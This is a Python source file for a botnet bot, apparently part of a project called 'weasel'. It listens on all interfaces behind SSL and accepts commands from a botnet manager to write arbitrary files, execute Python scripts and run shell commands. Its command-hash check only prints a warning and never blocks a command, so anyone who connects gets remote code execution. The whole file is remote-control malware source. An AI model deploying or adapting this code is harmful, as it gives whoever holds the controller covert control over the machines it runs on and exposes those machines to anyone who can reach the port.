#!/usr/bin/env python

import socket, threading, hashlib, os
import SocketServer, ssl, subprocess
import sys, time, signal
from weasel.bot.keymanager import KeyManager
from weasel.shared.config import BotConfig
from weasel.shared.parser import BotParser
from weasel.bot.statusmgr import StatusManager

shutdown_signaled = False

class ThreadedTCPRequestHandler(SocketServer.StreamRequestHandler):
    """ Request handler for threaded TCP bot server """

    def handle(self):
        received = []
        while not shutdown_signaled:
            try:
                data = self.request.recv(1024)
                if not data: break
                received.append(data)
            except socket.error as e:
                print(e)
                break
        command = ''.join(received)
        print("Handling {0} from {1}".format(command, self.client_address))
        self.handle_command(command)

    def handle_command(self, command):
        """ Handles a command from the botnet by first verifying that 
            the request is valid and then executing the request """

        # validate the command with the server
        hashed = hashlib.md5(command).hexdigest()
        is_valid = self.server.status_mgr.validate_cmd_hash(hashed)

        if not is_valid:
            print("Command {0} is not from a valid source, disregarding".format(command))

        parsed = self.server.parser.parse(command)    
        if(parsed[0] == 'ping'):
            self.server.status_mgr.notify_ping()
        elif(parsed[0] == 'put'):
            self.server.status_mgr.notify_activity(message='Loading the file: {0}'.format(parsed[1]))
            self.server.put_file(parsed[1], parsed[2])
        elif(parsed[0] == 'exec'):
            self.server.status_mgr.notify_activity(message='Executing the script: {0}'.format(parsed[1]))
            self.server.exec_file(parsed[1])
        elif(parsed[0] == 'execsh'):
            self.server.status_mgr.notify_activity(message='Executing the shell command: {0}'.format(parsed[1]))
            self.server.exec_shell(parsed[1])

class SecureThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    """ Threaded TCP server using SSL encryption"""

    def __init__(self, server_address, config):
        SocketServer.BaseServer.__init__(self, server_address, ThreadedTCPRequestHandler)

        key_mgr = KeyManager('.')
        key_mgr.create_keys()

        self.socket = socket.socket(self.address_family, self.socket_type)
        self.socket = ssl.wrap_socket(self.socket, keyfile=key_mgr.get_key_file(), 
                                    certfile=key_mgr.get_cert_file(), server_side=True)
        self.server_bind()
        self.server_activate()

        self.status_mgr = StatusManager(self.server_address[1], config)
        self.parser = BotParser()

    def start(self):
        """ Starts the server and sends startup signals to the botnet manager """
        print(server.server_address)
        self.status_mgr.notify_startup()         
        try:
            self.serve_forever()
        except (KeyboardInterrupt, SystemExit) as e:
            print("Caught an interrupt")
            self.status_mgr.notify_shutdown(message="Performing a clean shutdown")
            raise e
        except Exception as e:
            self.status_mgr.notify_shutdown(message="Shutting down due to error: {0}".format(e))
            raise e

    def put_file(self, filepath, content):
        """ Writes a script to the path specified by filepath """
        dirname, filename = os.path.split(filepath)
        if not os.path.exists(dirname):
           os.makedirs(dirname)
        handle = open(filepath, 'w+')
        handle.write(content)
        handle.close()

    def exec_shell(self, content):
        """ Executes a shell command """
        proc = subprocess.Popen(content, stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()
        print("Shell output: {0}".format(out))
        print("Shell error: {0}".format(err))

    def exec_file(self, filename):
        """ Executes the file identified by filename """
        d = {}
        exec(compile(open(filename).read(), filename, 'exec'), d, d)
        
if __name__ == "__main__":

    config = BotConfig('bot.conf')
    host, port = "0.0.0.0", config.server_port
    server = SecureThreadedTCPServer((host, port), config)
    server.start()

    try:
        while True: time.sleep(100)
    except (KeyboardInterrupt, SystemExit):
        print("Caught an interrupt")
        server.shutdown()
        raise
